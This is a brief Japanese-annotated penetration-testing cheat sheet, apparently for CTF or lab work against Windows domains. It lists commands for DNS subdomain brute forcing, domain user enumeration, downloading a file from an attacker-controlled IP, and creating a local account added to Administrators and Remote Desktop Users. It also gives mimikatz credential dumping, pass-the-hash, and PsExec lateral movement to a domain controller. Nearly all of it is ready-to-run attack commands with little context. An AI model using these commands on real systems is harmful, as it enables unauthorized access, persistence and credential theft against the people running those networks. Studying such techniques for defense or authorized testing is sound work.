#サブドメイン検索
gobuster dns -d <dnsサーバのIP> -t 25 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

net user /domain
nslookup <domain>

#Download(Windows)
wget http://<IP>/<File> -OutFile <File>

#アカウントを作成し、RemoteDesktopUsersに追加
net user test password /add
net localgroup administrators test /add
net localgroup "Remote Desktop Users" test /add
net group /domain
net user /domain

#mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM hash>
.\PsExec64.exe -accepteula
.\PsExec64.exe \\dc cmd.exe
